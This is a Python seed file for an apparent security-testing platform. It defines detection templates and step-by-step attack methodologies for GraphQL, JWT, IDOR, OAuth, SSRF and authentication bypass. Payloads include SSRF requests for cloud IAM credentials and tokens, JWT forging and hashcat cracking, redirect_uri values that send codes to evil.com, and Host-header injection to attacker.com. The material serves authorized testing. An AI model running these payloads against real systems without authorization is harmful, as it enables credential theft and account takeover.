"""Seed reference catalogs and built-in detection templates. No mock data."""
from __future__ import annotations

import json
import uuid
from datetime import datetime, timezone

from . import db
from .config import get_settings
from .services import playbooks, profiles, project_templates, tool_registry


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


INTEGRATION_CATALOG = [
    ("jira", "Jira", "apikey"), ("gitlab", "GitLab", "oauth"), ("github", "GitHub", "oauth"),
    ("slack", "Slack", "oauth"), ("msteams", "Microsoft Teams", "oauth"),
    ("email", "Email (SMTP)", "apikey"), ("webhook", "Custom Webhook", "apikey"),
    ("aws", "AWS", "apikey"), ("azure", "Azure", "apikey"), ("gcp", "GCP", "apikey"),
    ("cloudflare", "Cloudflare", "apikey"), ("digitalocean", "DigitalOcean", "apikey"),
    ("kubernetes", "Kubernetes", "apikey"),
]

BUILTIN_TEMPLATES = [
    {"template_id": "exposed-docker-api", "name": "Exposed Docker Engine API",
     "category": "Exposed Docker & K8s", "severity": "critical", "tags": ["docker", "exposure", "rce"],
     "yaml": "id: exposed-docker-api\ninfo:\n  name: Exposed Docker Engine API\n  severity: critical\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}/version\"]\n    matchers:\n      - type: word\n        part: body\n        words: [\"ApiVersion\"]\n"},
    {"template_id": "exposed-kubernetes-api", "name": "Unauthenticated Kubernetes API Server",
     "category": "Exposed Docker & K8s", "severity": "critical", "tags": ["kubernetes", "exposure"],
     "yaml": "id: exposed-kubernetes-api\ninfo:\n  name: Unauthenticated Kubernetes API\n  severity: critical\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}/api/v1/namespaces\"]\n    matchers:\n      - type: word\n        part: body\n        words: [\"NamespaceList\"]\n"},
    {"template_id": "cloud-metadata-ssrf", "name": "Cloud Metadata Endpoint Reachable",
     "category": "Cloud Metadata Endpoints", "severity": "high", "tags": ["ssrf", "cloud", "imds"],
     "yaml": "id: cloud-metadata-ssrf\ninfo:\n  name: Cloud Metadata Endpoint Reachable\n  severity: high\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}/latest/meta-data/iam/security-credentials/\"]\n    matchers:\n      - type: regex\n        part: body\n        regex: [\"AccessKeyId\"]\n"},
    {"template_id": "aws-keys-exposure", "name": "AWS Access Keys Exposed",
     "category": "AWS Keys Exposure", "severity": "high", "tags": ["aws", "secrets"],
     "yaml": "id: aws-keys-exposure\ninfo:\n  name: AWS Access Keys Exposed\n  severity: high\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}\"]\n    matchers:\n      - type: regex\n        part: body\n        regex: [\"AKIA[0-9A-Z]{16}\"]\n"},
    {"template_id": "unauth-config-secrets", "name": "Unauthenticated Secrets Exposure",
     "category": "Secrets Exposure", "severity": "critical", "tags": ["secrets", "exposure"],
     "yaml": "id: unauth-config-secrets\ninfo:\n  name: Unauthenticated Secrets Exposure\n  severity: critical\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}/.env\", \"{{BaseURL}}/actuator/env\", \"{{BaseURL}}/config.json\"]\n    matchers:\n      - type: regex\n        part: body\n        regex: [\"(?i)(secret|password|api_key)\\\\s*[=:]\"] \n"},
    {"template_id": "open-redirect", "name": "Open Redirect",
     "category": "Open Redirect", "severity": "medium", "tags": ["redirect"],
     "yaml": "id: open-redirect\ninfo:\n  name: Open Redirect\n  severity: medium\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}/redirect?url=https://example.org\"]\n    matchers:\n      - type: regex\n        part: header\n        regex: [\"Location:\\\\s*https?://example\\\\.org\"]\n"},
    {"template_id": "idor-sequential-id", "name": "Unauthenticated IDOR via Sequential IDs",
     "category": "Broken Access Control", "severity": "high", "tags": ["idor", "bac"],
     "yaml": "id: idor-sequential-id\ninfo:\n  name: Unauthenticated IDOR\n  severity: high\nrequests:\n  - method: GET\n    path: [\"{{BaseURL}}/api/objects/1\", \"{{BaseURL}}/api/objects/2\"]\n    matchers:\n      - type: status\n        status: [200]\n"},
]


def seed() -> None:
    settings = get_settings()
    now = _now()
    for severity, days in settings.sla_defaults.items():
        db.upsert("sla_policy", {"severity": severity, "days": days},
                  conflict_cols=["severity"], update_cols=["days"])
    for itype, name, auth_kind in INTEGRATION_CATALOG:
        if db.query_one("SELECT id FROM integrations WHERE type=?", [itype]):
            continue
        db.insert("integrations", {"id": str(uuid.uuid4()), "type": itype, "name": name,
                                    "status": "available", "auth_kind": auth_kind,
                                    "config": "{}", "created_at": now})
    for t in BUILTIN_TEMPLATES:
        db.upsert("templates",
                  {"id": str(uuid.uuid4()), "template_id": t["template_id"], "name": t["name"],
                   "category": t["category"], "severity": t["severity"], "source": "builtin",
                   "yaml": t["yaml"], "tags": json.dumps(t["tags"]), "created_at": now},
                  conflict_cols=["template_id"],
                  update_cols=["name", "category", "severity", "yaml", "tags"])
    profiles.seed()
    playbooks.seed()
    project_templates.seed()
    tool_registry.seed()
    _seed_techniques(now)


def _seed_techniques(now: str) -> None:
    """Seed built-in technique guides. Idempotent via ON CONFLICT DO NOTHING."""
    TECHNIQUES = [
        {
            "id": "tech-graphql", "name": "GraphQL Security Audit", "slug": "graphql",
            "description": "Systematic GraphQL endpoint discovery, introspection, and exploitation methodology.",
            "category": "api", "difficulty": "medium",
            "cwe_classes": json.dumps(["CWE-200", "CWE-285", "CWE-284"]),
            "tags": json.dumps(["graphql", "api", "introspection", "idor"]),
            "stages": [
                {"name": "Endpoint Discovery", "goal": "Find all GraphQL endpoints on the target",
                 "description": "GraphQL endpoints are often at /graphql, /api/graphql, /v1/graphql, or exposed via JS bundles.",
                 "tests": [
                     {"name": "Common path probe", "tool": "gori",
                      "payload": "GET /graphql\nGET /api/graphql\nGET /graphql/v1\nGET /query\nGET /gql",
                      "expected": "200 OK with Content-Type: application/json or graphql error"},
                     {"name": "OPTIONS check for CORS", "tool": "gori",
                      "payload": "OPTIONS /graphql\nOrigin: https://evil.com",
                      "expected": "Access-Control-Allow-Origin: * or wildcard"},
                     {"name": "JS bundle scan", "tool": "manual",
                      "payload": "grep -r 'graphql\\|/gql' js bundles for endpoint strings",
                      "expected": "Hard-coded endpoint paths or fragments"},
                 ]},
                {"name": "Introspection Probe", "goal": "Extract full schema via introspection",
                 "description": "Introspection exposes the entire type system. Many apps leave it enabled in production.",
                 "tests": [
                     {"name": "Full introspection query", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}',
                      "expected": "__schema data returned — full type map"},
                     {"name": "Type-based enumeration", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{__type(name:\"Query\"){fields{name}}}"}',
                      "expected": "List of all query fields — attack surface"},
                     {"name": "Mutations enumeration", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{__type(name:\"Mutation\"){fields{name args{name type{name}}}}}"}',
                      "expected": "List of all mutations + argument names"},
                 ]},
                {"name": "Disabled Introspection Bypass", "goal": "Bypass introspection blocklists",
                 "description": "Many WAFs block __schema but not __type or field-level queries.",
                 "tests": [
                     {"name": "__type bypass", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{__type(name:\"Query\"){name fields{name}}}"}',
                      "expected": "Field names returned even when __schema is blocked"},
                     {"name": "Clairvoyance wordlist attack", "tool": "manual",
                      "payload": "python3 clairvoyance.py -t https://target/graphql -w wordlist.txt",
                      "expected": "Schema reconstruction via field-name bruteforce"},
                     {"name": "Newline/whitespace bypass", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{\\n__schema{\\ntypes{name}\\n}}"}',
                      "expected": "Some WAFs miss newlines in queries"},
                 ]},
                {"name": "Authorization Testing", "goal": "Find broken object-level auth in resolvers",
                 "description": "Resolvers often use user IDs from JWT claims without re-validating ownership.",
                 "tests": [
                     {"name": "IDOR via resolver args", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{user(id:\\"OTHER_USER_ID\\"){email phone}}"}',
                      "expected": "Data returned for other user IDs = IDOR"},
                     {"name": "Nested object auth bypass", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{order(id:1){user{admin}}}"}',
                      "expected": "admin field returned for non-admin user"},
                     {"name": "Alias-based auth bypass", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{a:user(id:1){email} b:user(id:2){email}}"}',
                      "expected": "Multiple user data returned via aliases"},
                 ]},
                {"name": "Injection & DoS", "goal": "Test for injection and resource exhaustion",
                 "description": "Deeply nested queries can exhaust server resources; variables may be injectable.",
                 "tests": [
                     {"name": "Deep nesting DoS", "tool": "gori",
                      "payload": 'POST /graphql\n{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{}}}}}}}}}}}}}}}}"}',
                      "expected": "Server timeout or 500 — depth limit absent"},
                     {"name": "Batch query amplification", "tool": "gori",
                      "payload": 'POST /graphql\n[{"query":"{user{email}}"}, {"query":"{user{email}}"}, ...]',
                      "expected": "All queries execute — rate limit absent"},
                     {"name": "SQL injection via variables", "tool": "gori",
                      "payload": "POST /graphql\n{\"query\":\"query($id:String){user(id:$id){email}}\",\"variables\":{\"id\":\"1 OR 1=1\"}}",
                      "expected": "SQL error or unexpected data = injection point"},
                 ]},
            ],
        },
        {
            "id": "tech-jwt", "name": "JWT Attack Methodology", "slug": "jwt",
            "description": "JWT signature bypass, algorithm confusion, and secret cracking.",
            "category": "auth", "difficulty": "medium",
            "cwe_classes": json.dumps(["CWE-347", "CWE-327", "CWE-306"]),
            "tags": json.dumps(["jwt", "auth", "alg-none", "hmac"]),
            "stages": [
                {"name": "Token Recon", "goal": "Collect and decode JWTs from traffic",
                 "description": "JWTs appear in Authorization headers, cookies, and URL params.",
                 "tests": [
                     {"name": "Identify JWT in traffic", "tool": "gori",
                      "payload": "Filter history: header contains 'Bearer eyJ'",
                      "expected": "Find all Bearer tokens in traffic"},
                     {"name": "Decode header/payload", "tool": "manual",
                      "payload": "echo 'eyJ...' | cut -d'.' -f1,2 | tr '_-' '/+' | base64 -d",
                      "expected": "{\"alg\":\"HS256\"} — note algorithm and claims"},
                 ]},
                {"name": "Algorithm Attacks", "goal": "Forge tokens via algorithm confusion",
                 "description": "none algorithm, RS256→HS256 confusion, and weak key signing.",
                 "tests": [
                     {"name": "alg:none bypass", "tool": "gori",
                      "payload": "Replace header with {\"alg\":\"none\",\"typ\":\"JWT\"}, strip signature, keep trailing dot",
                      "expected": "Server accepts token = critical auth bypass"},
                     {"name": "RS256→HS256 confusion", "tool": "manual",
                      "payload": "Sign token with HS256 using the RSA public key as HMAC secret",
                      "expected": "Server verifies HMAC with public key = forged token accepted"},
                     {"name": "Weak secret brute-force", "tool": "manual",
                      "payload": "hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt",
                      "expected": "Secret found = forge any token"},
                 ]},
                {"name": "Claim Manipulation", "goal": "Escalate privileges via claim tampering",
                 "description": "Change role, admin, sub claims after breaking signature.",
                 "tests": [
                     {"name": "Role/admin escalation", "tool": "gori",
                      "payload": "Modify {\"role\":\"admin\"} or {\"is_admin\":true} in payload, re-sign",
                      "expected": "Admin functionality accessible"},
                     {"name": "sub/user_id IDOR", "tool": "gori",
                      "payload": "Change sub claim to another user's ID",
                      "expected": "Access to other user's data"},
                 ]},
            ],
        },
        {
            "id": "tech-idor", "name": "IDOR / Broken Object Level Auth", "slug": "idor",
            "description": "Enumerate object IDs, test cross-account access, and find mass assignment.",
            "category": "access-control", "difficulty": "easy",
            "cwe_classes": json.dumps(["CWE-284", "CWE-285", "CWE-639"]),
            "tags": json.dumps(["idor", "bola", "access-control", "api"]),
            "stages": [
                {"name": "ID Surface Mapping", "goal": "Catalog all object ID parameters",
                 "description": "Find UUIDs, integers, hashes in URL paths, query params, and request bodies.",
                 "tests": [
                     {"name": "Enumerate IDs in Caido sitemap", "tool": "gori",
                      "payload": "List sitemap, filter: path contains /api/ and has numeric or UUID segment",
                      "expected": "Object endpoints: /api/users/{id}, /orders/{id}, etc."},
                     {"name": "Parameter discovery", "tool": "gori",
                      "payload": "List params for endpoints — look for id, user_id, account_id, doc_id",
                      "expected": "Object reference parameters to test"},
                 ]},
                {"name": "Cross-Account Test", "goal": "Access other users' objects",
                 "description": "With two accounts, swap IDs between sessions to test isolation.",
                 "tests": [
                     {"name": "Account A reads Account B resource", "tool": "gori",
                      "payload": "With Account A session, GET /api/resource/{B_resource_id}",
                      "expected": "403 expected; 200 = IDOR"},
                     {"name": "Sequential ID enumeration", "tool": "gori",
                      "payload": "Fuzz: GET /api/orders/FUZZ with numbers 1-1000",
                      "expected": "Other users' orders returned = mass IDOR"},
                     {"name": "GUID prediction", "tool": "manual",
                      "payload": "Check if UUIDs are v1 (time-based) → predictable",
                      "expected": "UUID v1 → enumerate by timestamp"},
                 ]},
                {"name": "Mass Assignment", "goal": "Inject unpermitted fields via PUT/PATCH",
                 "description": "APIs that bind all body fields may allow setting admin, role, balance.",
                 "tests": [
                     {"name": "Role escalation via PUT", "tool": "gori",
                      "payload": "PUT /api/users/self {\"email\":\"x@x.com\",\"role\":\"admin\"}",
                      "expected": "role updated = mass assignment"},
                     {"name": "Account field injection", "tool": "gori",
                      "payload": "PATCH /api/profile {\"balance\":99999,\"plan\":\"enterprise\"}",
                      "expected": "Balance or plan changed = privilege escalation"},
                 ]},
            ],
        },
        {
            "id": "tech-oauth", "name": "OAuth 2.0 / OIDC Attack Surface", "slug": "oauth",
            "description": "Authorization code interception, CSRF, redirect_uri bypass, and token leakage.",
            "category": "auth", "difficulty": "hard",
            "cwe_classes": json.dumps(["CWE-601", "CWE-352", "CWE-287"]),
            "tags": json.dumps(["oauth", "oidc", "redirect", "csrf", "pkce"]),
            "stages": [
                {"name": "Flow Mapping", "goal": "Map the OAuth flow and identify weaknesses",
                 "description": "Capture the full authorization code flow in Caido.",
                 "tests": [
                     {"name": "Capture auth flow", "tool": "gori",
                      "payload": "Start login, capture /authorize?client_id=...&redirect_uri=...&state=...",
                      "expected": "Full flow: /authorize → code → /token → access_token"},
                     {"name": "State parameter check", "tool": "manual",
                      "payload": "Is state present? Is it validated? Is it cryptographically random?",
                      "expected": "Absent or predictable state = CSRF on OAuth"},
                 ]},
                {"name": "Redirect URI Bypass", "goal": "Exfiltrate auth code to attacker domain",
                 "description": "Validation weaknesses let attackers redirect codes to their domain.",
                 "tests": [
                     {"name": "Open redirect chaining", "tool": "gori",
                      "payload": "redirect_uri=https://app.target.com/callback?next=https://evil.com",
                      "expected": "Code sent to evil.com via open redirect chain"},
                     {"name": "Path traversal bypass", "tool": "gori",
                      "payload": "redirect_uri=https://app.target.com/../evil.com/steal",
                      "expected": "Path traversal bypasses exact-match validation"},
                     {"name": "Subdomain takeover pivot", "tool": "manual",
                      "payload": "redirect_uri=https://unclaimed.target.com/callback",
                      "expected": "Unclaimed subdomain → take it over → steal codes"},
                 ]},
                {"name": "Token Leakage", "goal": "Find tokens in logs, referrers, or history",
                 "description": "Access tokens in URLs end up in server logs, Referer headers.",
                 "tests": [
                     {"name": "Token in URL param", "tool": "gori",
                      "payload": "Look for access_token= in URL params in traffic",
                      "expected": "Tokens in URLs leak via Referer to 3rd parties"},
                     {"name": "PKCE absent check", "tool": "manual",
                      "payload": "Is code_challenge present in /authorize? If not, code is interceptable",
                      "expected": "No PKCE on mobile/SPA = auth code interception"},
                 ]},
            ],
        },
        {
            "id": "tech-ssrf", "name": "SSRF Methodology", "slug": "ssrf",
            "description": "Server-Side Request Forgery via URL parameters, webhooks, and file imports.",
            "category": "injection", "difficulty": "medium",
            "cwe_classes": json.dumps(["CWE-918"]),
            "tags": json.dumps(["ssrf", "imds", "cloud", "blind"]),
            "stages": [
                {"name": "Surface Discovery", "goal": "Find all URL/file input parameters",
                 "description": "SSRF lives in webhook URLs, PDF generators, URL preview, import functions.",
                 "tests": [
                     {"name": "Parameter hunt", "tool": "gori",
                      "payload": "List params: url, link, fetch, proxy, redirect, src, href, path, file, page",
                      "expected": "URL-accepting parameters"},
                     {"name": "File import endpoints", "tool": "gori",
                      "payload": "Look for /import, /fetch, /preview, /render, /webhook endpoints",
                      "expected": "Server-side fetch functionality"},
                 ]},
                {"name": "Cloud Metadata Exfil", "goal": "Reach AWS/GCP/Azure IMDS",
                 "description": "169.254.169.254 is the magic IP for cloud metadata on EC2/GCE.",
                 "tests": [
                     {"name": "AWS metadata v1", "tool": "gori",
                      "payload": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                      "expected": "IAM role credentials in response = critical SSRF"},
                     {"name": "AWS metadata v2 bypass", "tool": "gori",
                      "payload": "url=http://169.254.169.254/latest/meta-data/ with X-aws-ec2-metadata-token header",
                      "expected": "IMDSv2 may still respond if token header forwarded"},
                     {"name": "GCP metadata", "tool": "gori",
                      "payload": "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                      "expected": "GCP access token"},
                 ]},
                {"name": "Blind SSRF", "goal": "Confirm SSRF with out-of-band interaction",
                 "description": "When response isn't reflected, use OAST/Burp Collaborator callbacks.",
                 "tests": [
                     {"name": "OAST callback via Caido", "tool": "gori",
                      "payload": "url=https://your-oast-id.oast.fun/ssrf-test — check callback",
                      "expected": "DNS/HTTP callback = blind SSRF confirmed"},
                     {"name": "Internal port scan", "tool": "gori",
                      "payload": "url=http://127.0.0.1:PORT/ for ports 22,80,443,3306,5432,6379,8080",
                      "expected": "Different response times/errors = port open vs closed"},
                 ]},
            ],
        },
        {
            "id": "tech-auth-bypass", "name": "Authentication Bypass", "slug": "auth-bypass",
            "description": "Mass account enumeration, password reset flaws, MFA bypass, and session fixation.",
            "category": "auth", "difficulty": "medium",
            "cwe_classes": json.dumps(["CWE-287", "CWE-640", "CWE-307"]),
            "tags": json.dumps(["auth", "mfa", "password-reset", "session", "enumeration"]),
            "stages": [
                {"name": "Account Enumeration", "goal": "Confirm user existence via timing/response differences",
                 "description": "Login and password-reset endpoints often reveal valid usernames.",
                 "tests": [
                     {"name": "Login timing oracle", "tool": "gori",
                      "payload": "POST /login {\"email\":\"valid@target.com\",\"password\":\"wrong\"} vs {\"email\":\"invalid@target.com\"}",
                      "expected": "Different response time or error message = enumeration"},
                     {"name": "Password reset user oracle", "tool": "gori",
                      "payload": "POST /password-reset {\"email\":\"test@target.com\"} — compare body/status for valid vs invalid",
                      "expected": "\"Email sent\" vs \"User not found\" = enumeration"},
                 ]},
                {"name": "Password Reset Flaws", "goal": "Hijack password reset tokens",
                 "description": "Weak token entropy, host header injection, and expired-token reuse.",
                 "tests": [
                     {"name": "Host header injection", "tool": "gori",
                      "payload": "POST /password-reset with Host: attacker.com — victim receives link to attacker.com",
                      "expected": "Password reset link contains attacker domain"},
                     {"name": "Token entropy check", "tool": "manual",
                      "payload": "Request 10 reset tokens — analyze entropy, timestamp-based?",
                      "expected": "Low entropy or predictable = forged reset"},
                     {"name": "Token expiry bypass", "tool": "gori",
                      "payload": "Use expired token from 24h ago",
                      "expected": "Still valid = no expiry check"},
                 ]},
                {"name": "MFA Bypass", "goal": "Skip 2FA via race conditions or fallback paths",
                 "description": "Race conditions on OTP consumption, SMS fallback, and backup codes.",
                 "tests": [
                     {"name": "OTP race condition", "tool": "gori",
                      "payload": "Send same OTP in 10 parallel requests (Caido race)",
                      "expected": "Multiple successes = OTP consumed non-atomically"},
                     {"name": "MFA step skip", "tool": "gori",
                      "payload": "After password step, directly access /dashboard without MFA step",
                      "expected": "Session already valid after password = MFA skippable"},
                     {"name": "Backup code bruteforce", "tool": "gori",
                      "payload": "Fuzz backup code endpoint with 6-digit codes, check rate limit",
                      "expected": "No rate limit = 1M codes brutable in minutes"},
                 ]},
            ],
        },
    ]

    for tech in TECHNIQUES:
        stages_data = tech.pop("stages")
        tech["builtin"] = 1
        tech["created_at"] = now
        # Upsert technique (name/desc/difficulty may change in updates)
        existing = db.query_one("SELECT id FROM techniques WHERE id=?", [tech["id"]])
        if not existing:
            db.insert("techniques", tech)
        else:
            db.execute(
                "UPDATE techniques SET name=?, description=?, category=?, difficulty=?, "
                "cwe_classes=?, tags=? WHERE id=?",
                [tech["name"], tech["description"], tech["category"], tech["difficulty"],
                 tech["cwe_classes"], tech["tags"], tech["id"]]
            )
        # Remove old stages (re-seed to pick up updates)
        db.execute("DELETE FROM technique_stages WHERE technique_id=?", [tech["id"]])
        for s_idx, stage in enumerate(stages_data):
            tests_data = stage.pop("tests")
            stage_id = f"{tech['id']}-s{s_idx}"
            db.insert("technique_stages", {
                "id": stage_id, "technique_id": tech["id"],
                "stage_order": s_idx, "name": stage["name"],
                "description": stage.get("description"), "goal": stage.get("goal"),
            })
            for t_idx, test in enumerate(tests_data):
                db.insert("technique_tests", {
                    "id": f"{stage_id}-t{t_idx}", "stage_id": stage_id,
                    "test_order": t_idx, "name": test["name"],
                    "description": test.get("description"),
                    "payload": test.get("payload"),
                    "tool": test.get("tool", "manual"),
                    "endpoint": test.get("endpoint"),
                    "expected": test.get("expected"),
                    "manual": 1,
                })
